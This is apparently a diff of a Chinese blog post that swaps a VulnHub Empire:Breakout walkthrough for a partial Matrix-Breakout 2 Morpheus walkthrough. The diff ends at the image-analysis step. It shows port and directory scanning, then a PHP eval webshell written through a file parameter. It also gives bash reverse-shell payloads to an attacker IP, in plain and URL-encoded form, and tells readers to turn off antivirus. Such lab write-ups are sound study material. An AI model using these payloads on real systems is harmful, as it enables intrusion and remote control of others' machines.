@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8">
   
-  <title>我的技术与生活——vulnhub靶场之EMPIRE:BREAKOUT | MS02423</title>
+  <title>我的技术与生活——vulnhub靶场之Matrix-Breakout 2 Morpheus | MS02423</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <link rel="shortcut icon" href="/imgs/shortcut-icon.ico" type="image/x-icon">
   <link rel="stylesheet" href="/css/public.css" />
@@ -16,7 +16,7 @@
 
   <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
   <script>
-    document.title = `我的技术与生活——vulnhub靶场之EMPIRE:BREAKOUT`
+    document.title = `我的技术与生活——vulnhub靶场之Matrix-Breakout 2 Morpheus`
   </script>
 <meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="MS02423" type="application/atom+xml">
 </head>
@@ -372,7 +372,7 @@ pre:active {
 
 <div class="article-container">
   <div class="article">
-    <h1 class="article-title">vulnhub靶场之EMPIRE:BREAKOUT</h1>
+    <h1 class="article-title">vulnhub靶场之Matrix-Breakout 2 Morpheus</h1>
     <div class="article-info">
       <div class="article-info--item">
         <div class="article-info--info">
@@ -383,7 +383,7 @@ pre:active {
       <span class="post-meta-item-icon">
         <i class="fa fa-keyboard-o"></i>
         <span class="post-meta-item-text">  字数统计: </span>
-        <span class="post-count">1,317字</span>
+        <span class="post-count">1,332字</span>
       </span>
     </span>
     &nbsp; | &nbsp;
@@ -391,7 +391,7 @@ pre:active {
       <span class="post-meta-item-icon">
         <i class="fa fa-hourglass-half"></i>
         <span class="post-meta-item-text">  阅读时长: </span>
-        <span class="post-count">5分</span>
+        <span class="post-count">6分</span>
       </span>
     </span>
 </div> 
@@ -407,122 +407,141 @@ pre:active {
             <a class="tag-link" href="/tags/vulnhub%E9%9D%B6%E5%9C%BA/" rel="tag">vulnhub靶场</a>
           </div>
           
-          <p class="article-info--date">日期：2024-01-15 20:18:46</p>
+          <p class="article-info--date">日期：2024-01-26 20:50:32</p>
         </div>
-        <img src="/imgs/16.jpg" alt="" class="article-cover">
+        <img src="/imgs/10.jpg" alt="" class="article-cover">
       </div>
     </div>
     <article class="article-content">
-      <h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Description
-Back <span class="token keyword">to</span> the <span class="token keyword">Top</span>
-Difficulty<span class="token punctuation">:</span> Easy
-This box was created <span class="token keyword">to</span> be an Easy box<span class="token punctuation">,</span> but it can be Medium <span class="token keyword">if</span> you get lost<span class="token punctuation">.</span>
-<span class="token keyword">For</span> hints discord Server <span class="token punctuation">(</span> https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>discord<span class="token punctuation">.</span>gg<span class="token operator">/</span>7asvAhCEhe <span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+      <h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">This <span class="token keyword">is</span> the second <span class="token keyword">in</span> the Matrix-Breakout series<span class="token punctuation">,</span> subtitled Morpheus<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">.</span> It’s themed <span class="token keyword">as</span> a throwback <span class="token keyword">to</span> the <span class="token keyword">first</span> Matrix movie<span class="token punctuation">.</span> You play Trinity<span class="token punctuation">,</span> trying <span class="token keyword">to</span> investigate a computer <span class="token keyword">on</span> the Nebuchadnezzar that Cypher has locked everyone <span class="token keyword">else</span> out <span class="token keyword">from</span><span class="token punctuation">,</span> which holds the <span class="token keyword">key</span> <span class="token keyword">to</span> a mystery<span class="token punctuation">.</span>
+Difficulty<span class="token punctuation">:</span> Medium-Hard <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>empire-breakout<span class="token punctuation">,</span><span class="token number">751</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>matrix-breakout-2-morpheus<span class="token punctuation">,</span><span class="token number">757</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202624114.png" alt="image-20240115202624114"></p>
-<h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202638120.png" alt="image-20240115202638120"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205617771.png" alt="image-20240126205617771"></p>
+<h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205642803.png" alt="image-20240126205642803"></p>
 <p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，网段知道：192.168.52.0&#x2F;24</p>
 <h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.52.0&#x2F;24</p>
 <h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.52.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115202948264.png" alt="image-20240115202948264"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126205804406.png" alt="image-20240126205804406"></p>
 <pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203526580.png" alt="image-20240115203526580"></p>
-<p>靶场真实ip地址为192.168.52.134</p>
-<h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-A</span> <span class="token parameter variable">-v</span> -p- <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210338945.png" alt="image-20240126210338945"></p>
+<p>靶场真实ip地址为192.168.52.135</p>
+<h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203205199.png" alt="image-20240115203205199"></p>
-<p>这里我们不使用这个命令，这个命令看起来太麻烦了，我们使用另一个命令，更加直观</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203444747.png" alt="image-20240115203444747"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210944454.png" alt="image-20240126210944454"></p>
 <pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">80</span>端口，APache httpd <span class="token number">2.4</span><span class="token number">.51</span><span class="token punctuation">(</span><span class="token punctuation">(</span>Debian<span class="token punctuation">)</span><span class="token punctuation">)</span>
-发现开启了<span class="token number">139,445</span>端口，Samba smbd <span class="token number">4.6</span><span class="token number">.2</span>
-发现开启了<span class="token number">10000,20000</span>端口， MiniServ <span class="token number">1.830</span> <span class="token punctuation">(</span>Webmin httpd<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">8</span><span class="token punctuation">.</span>4p1 Debian <span class="token number">5</span> <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
+发现开启了<span class="token number">81</span>端口<span class="token punctuation">,</span>nginx <span class="token number">1.18</span><span class="token number">.0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
 <p>也可以使用masscan进行探测</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115203636268.png" alt="image-20240115203636268"></p>
-<h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">masscan <span class="token parameter variable">--rate</span><span class="token operator">=</span><span class="token number">10000</span> <span class="token parameter variable">--ports</span> <span class="token number">0</span>-65535 <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204012504.png" alt="image-20240115204012504"></p>
-<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126210530329.png" alt="image-20240126210530329"></p>
+<h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204153015.png" alt="image-20240115204153015"></p>
-<p>是一个apache2页面，我们查看源码，可以看到一个加密的过后的字符串，我们进行解密</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204250195.png" alt="image-20240115204250195"></p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205820955.png" alt="image-20240115205820955"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.2uqPEfj3D<span class="token operator">&lt;</span>P'a-3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211229279.png" alt="image-20240126211229279"></p>
+<h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>这应该是一个密码，先记录下来，接着我们继续查看另外两个网站</p>
-<p> 10000端口和20000端口是不同的登录系统，一个是登录网站的，一个是登录用户的</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204936324.png" alt="image-20240115204936324"></p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204954830.png" alt="image-20240115204954830"></p>
-<h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211330248.png" alt="image-20240126211330248"></p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.135:81<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204419404.png" alt="image-20240115204419404"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211351460.png" alt="image-20240126211351460"></p>
+<p>访问81端口，发现需要账号密码，尝试了一下弱口令，未能成功登录。</p>
+<h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211525473.png" alt="image-20240126211525473"></p>
 <p>没有有用的信息</p>
-<h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.52.135<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204742223.png" alt="image-20240115204742223"></p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115204808713.png" alt="image-20240115204808713"></p>
-<p>但是没有什么用</p>
-<h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.134 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211638612.png" alt="image-20240126211638612"></p>
+<h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.52.135 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115205327708.png" alt="image-20240115205327708"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211907378.png" alt="image-20240126211907378"></p>
+<p>扫描到一个robots.txt</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126211845683.png" alt="image-20240126211845683"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126212009937.png" alt="image-20240126212009937"></p>
 <p>没有任何信息</p>
-<h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-enum4linux-收集用户"><a href="#1-enum4linux-收集用户" class="headerlink" title="1)enum4linux 收集用户"></a>1)enum4linux 收集用户</h4><p>我们已经有了用户的密码，所以我们要着手寻找用户名了,由于靶机开放了smb服务，所以我们可以收集有关靶机smb的信息, 使用命令enum4linux可以收集大量的信息</p>
-<p>Enum4linux 是一个用于枚举和收集信息的开源工具，特别是在Windows环境下进行。它设计用于与SMB&#x2F;CIFS（Server Message Block&#x2F;Common Internet File System）协议交互，该协议通常用于在Windows网络中共享文件和打印机。<br>以下是 Enum4linux 的主要功能：<br>用户和组枚举： Enum4linux 可以列出目标系统上的用户和组，包括一些敏感信息，如用户ID（UID）、组ID（GID）、用户描述等。<br>共享枚举： 它可以枚举目标系统上的共享资源，包括共享名称、共享路径和共享类型。<br>策略枚举： 工具可以提取目标系统的安全策略信息，包括密码策略和帐户锁定策略。<br>会话和会话枚举： 它可以列举活动会话，显示与系统相关的用户信息。<br>操作系统版本信息： Enum4linux 试图识别目标系统的操作系统版本。</p>
-<pre class="line-numbers language-none"><code class="language-none">enum4linux 192.168.52.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>截止到目前，我们没有找到任何有用的信息，我们可以换一个思路进行</p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">还是将重点放回<span class="token number">80</span>端口，因为robot<span class="token punctuation">.</span>txt提示我们继续找找，可能是因为我们的字典太小了，我们换个扫描器换个字典试下<span class="token punctuation">,</span>我们使用另外两个字典进行扫描<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210318907.png" alt="image-20240115210318907"></p>
-<p>获得了一个用户名cyber</p>
-<h4 id="2-登录用户名"><a href="#2-登录用户名" class="headerlink" title="2)登录用户名"></a>2)登录用户名</h4><p>登录一下20000端口,登录进去一看，发现左下角有一个终端的图标，点进去之后就可以运行命令了</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210853717.png" alt="image-20240115210853717"></p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115210944182.png" alt="image-20240115210944182"></p>
-<p>我们可以找到第一个flag</p>
-<h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><p>我们查看权限，不是root权限，我们进行提权</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211201249.png" alt="image-20240115211201249"></p>
-<p>我们先反弹shell</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211424046.png" alt="image-20240115211424046"></p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211412338.png" alt="image-20240115211412338"></p>
-<p>我们可以看到反弹成功</p>
-<p>除了user.txt,还发现一个 tar 文件，查看一下文件的相关属性</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115211811673.png" alt="image-20240115211811673"></p>
-<p>突然给这么一个可运行文件肯定是有深意的，我们看一下这个文件拥有的权限是什么</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">getcap <span class="token function">tar</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf <span class="token parameter variable">-u</span> http://192.168.52.135/FUZZ <span class="token parameter variable">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt <span class="token parameter variable">-c</span> <span class="token parameter variable">-ic</span> <span class="token parameter variable">-e</span> .txt,.zip,.php,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212155675.png" alt="image-20240115212155675"></p>
-<p>getcap是一个Linux命令，用于获取文件的能力（capabilities）信息。在Linux中，能力是一种粒度更细的权限系统，用于授予进程执行特定操作的权限，而不是传统的用户和组权限模型。</p>
-<p>发现有 cap_dac_read_search&#x3D;ep 功能，能读取文件，发现它是可以读取任意文件的,有关linux setcap命令的信息,查看下面链接</p>
-<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;iamfy&#x2F;archive&#x2F;2012&#x2F;09&#x2F;20&#x2F;2694977.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220323300.png" alt="image-20240126220323300"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126220400619.png" alt="image-20240126220400619"></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> <span class="token parameter variable">-u</span> http://192.168.52.135 <span class="token parameter variable">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="token parameter variable">-x</span> php,txt,html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>后来在 &#x2F;var&#x2F;backups 目录下发现了一个密码备份文件：</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115212857546.png" alt="image-20240115212857546"></p>
-<p>其实如果我们想在kali里面寻找文件，我们可以使用如下命令</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token parameter variable">-name</span> <span class="token string">"*bak*"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221049984.png" alt="image-20240126221049984"></p>
+<pre class="line-numbers language-none"><code class="language-none">graffiti.txt
+graffiti.php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213621962.png" alt="image-20240115213621962"></p>
-<p>只能由root用户读取，不过之前发现 tar 可以读取任意文件，那就用 tar 读取文件</p>
-<p>tar tar -tvf archive.tar</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115213856570.png" alt="image-20240115213856570"></p>
-<p>我们用tar把它打包之后再解压出来，就没有权限问题了</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./tar <span class="token parameter variable">-cvf</span> MS02423.tar /var/backups/.old_pass.bak
- <span class="token function">tar</span> <span class="token parameter variable">-xvf</span> MS02423.tar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>接下来我们访问这两个php,txt文件</p>
+<h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-访问graffiti-php页面"><a href="#1-访问graffiti-php页面" class="headerlink" title="1)访问graffiti.php页面"></a>1)访问graffiti.php页面</h4><p>我们可以看到有一个输入框，我们输入MS02423,看到返回页面显示了MS02423</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126221929278.png" alt="image-20240126221929278"></p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222001551.png" alt="image-20240126222001551"></p>
+<h4 id="2-访问graffiti-txt页面"><a href="#2-访问graffiti-txt页面" class="headerlink" title="2)访问graffiti.txt页面"></a>2)访问graffiti.txt页面</h4><p>我们可以看到返回页面和graffiti.php页面是一样的</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240126222026957.png" alt="image-20240126222026957"></p>
+<p>然后我们进行抓包看看，我们可以看到变量名是file</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127205656535.png" alt="image-20240127205656535"></p>
+<p>此处有一个file变量，那么改变file变量可以直接对靶机文件修改，能随意创建文件,二话不说写个马，准备反弹shell</p>
+<h4 id="3-抓包写入一句话木马"><a href="#3-抓包写入一句话木马" class="headerlink" title="3)抓包写入一句话木马"></a>3)抓包写入一句话木马</h4><p>在burp里面空格要使用+号代替</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">message</span><span class="token operator">=</span><span class="token operator">&lt;</span>?php+@eval<span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span>MS02423<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">>&amp;</span><span class="token assign-left variable">file</span><span class="token operator">=</span>MS02423.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215554730.png" alt="image-20240115215554730"></p>
-<p>cat之后获得了root密码</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115215623797.png" alt="image-20240115215623797"></p>
-<p>我们登录root，但是发现这里有bug</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220415090.png" alt="image-20240115220415090"></p>
-<p>那么我们就反弹shell</p>
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115222410774.png" alt="image-20240115222410774"></p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">>&amp;</span> /dev/tcp/192.168.52.152/666666 <span class="token operator"><span class="token file-descriptor important">0</span>></span><span class="token file-descriptor important">&amp;1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127210157312.png" alt="image-20240127210157312"></p>
+<pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">在写入一句话木马的时候，大家一定要把火绒关闭，不然的话会把杀掉<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240115220344317.png" alt="image-20240115220344317"></p>
-<p>可反弹成功，在此登录root就可以看到最终的flag了</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211015900.png" alt="image-20240127211015900"></p>
+<p>蚁剑连接成功，我们可以看到一些文件，但是都没有什么用</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211104975.png" alt="image-20240127211104975"></p>
+<p>我们进入虚拟终端看看有没有什么东西，最后发现了一个flag 1</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127211735204.png" alt="image-20240127211735204"></p>
+<p>我们找到了Flag 1!,提示我们从80端口的Web服务器中提取此图像以获得另外一个flag，图像的名称叫&#x2F;.cypher-neo.png,可以看到是一个隐藏文件。</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127212421628.png" alt="image-20240127212421628"></p>
+<h4 id="4-反弹webshell"><a href="#4-反弹webshell" class="headerlink" title="4)反弹webshell"></a>4)反弹webshell</h4><p>蚁剑的文件不是完整的，可能会有隐藏文件，此处简单一点直接在反弹shell双管齐下（一句话魔改一下）（记得要弄url编码）（干掉问号和空格和&amp;）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">&lt;</span>?php exec<span class="token punctuation">(</span><span class="token string">"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.52.152/666 0>&amp;1'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> ?<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>编码之后,访问文件即可即可反弹shell</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">%3C%3Fphp+exec%28%22%2Fbin%2Fbash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.168.52.152%2F666+0%3E%261%27%22%29%3B+%3F%3E  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213134624.png" alt="image-20240127213134624"></p>
+<p>浏览器访问即可</p>
+<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.52.152&#x2F;3.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>我们使用ls -la 可以看到隐藏图片，我们进行下载到kali</p>
+<p><img src="/./../imgs/$%7Bfiilename%7D/image-20240127213800385.png" alt="image-20240127213800385"></p>
+<h4 id="5-分析图片"><a href="#5-分析图片" class="headerlink" title="5)分析图片"></a>5)分析图片</h4><p>我们访问图片</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.52.135/.cypher-neo.png<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
